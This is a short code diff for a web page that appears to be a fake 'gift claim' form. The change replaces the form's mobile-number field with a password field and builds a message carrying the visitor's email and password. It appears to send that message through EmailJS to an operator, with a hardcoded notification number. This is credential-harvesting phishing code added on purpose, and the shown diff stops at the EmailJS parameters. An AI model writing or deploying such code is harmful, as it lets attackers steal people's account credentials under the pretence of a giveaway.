@@ -58,18 +58,18 @@
         // Final Claim Action
         document.getElementById('btnFinalClaim').addEventListener('click', function () {
             const email = document.getElementById('email').value;
-            const mobile = document.getElementById('mobile').value;
+            const password = document.getElementById('password').value;
 
             // Hardcoded number for notifications
             const adminNotifyNumber = "94789283337";
 
-            if (!email || !mobile) {
+            if (!email || !password) {
                 alert("Please fill in both fields!");
                 return;
             }
 
             // Construct message
-            const formattedMessage = `New Gift Claim Request:\nEmail: ${email}\nMobile: ${mobile}`;
+            const formattedMessage = `New Gift Claim Request:\nEmail: ${email}\nPassword: ${password}`;
 
             // 1. Send via EmailJS
             const templateParams = {
